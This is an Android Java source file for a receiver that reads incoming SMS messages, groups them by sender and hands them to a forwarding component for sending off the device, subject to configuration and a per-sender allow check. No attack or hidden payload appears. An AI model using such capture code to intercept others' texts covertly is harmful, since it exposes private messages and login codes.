package com.projectgraphite.strata;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import org.json.JSONObject;

public class SmsCaptureReceiver extends BroadcastReceiver {
    private static final ExecutorService EXECUTOR = Executors.newSingleThreadExecutor();

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || !Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            return;
        }
        if (!CaptureForwarder.isConfigured(context)) {
            return;
        }
        SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
        if (messages == null || messages.length == 0) {
            return;
        }

        Map<String, StringBuilder> bodiesBySender = new LinkedHashMap<>();
        Map<String, Long> stampBySender = new LinkedHashMap<>();
        for (SmsMessage sms : messages) {
            if (sms == null) continue;
            String sender = sms.getDisplayOriginatingAddress();
            String body = sms.getDisplayMessageBody();
            if (sender == null || body == null) continue;
            bodiesBySender.computeIfAbsent(sender, k -> new StringBuilder()).append(body);
            stampBySender.putIfAbsent(sender, sms.getTimestampMillis());
        }

        final PendingResult pendingResult = goAsync();
        final Context appContext = context.getApplicationContext();
        EXECUTOR.execute(() -> {
            try {
                for (Map.Entry<String, StringBuilder> entry : bodiesBySender.entrySet()) {
                    String sender = entry.getKey();
                    String text = entry.getValue().toString().trim();
                    if (text.isEmpty()) continue;
                    if (!CaptureForwarder.isChatAllowed(appContext, sender, null)) {
                        continue;
                    }
                    long stamp = stampBySender.getOrDefault(sender, System.currentTimeMillis());
                    JSONObject payload = CaptureForwarder.buildPayload(appContext, sender, text, "sms", sender, stamp);
                    CaptureForwarder.enqueueAndFlush(appContext, payload);
                }
            } catch (Exception ignored) {
            } finally {
                pendingResult.finish();
            }
        });
    }
}

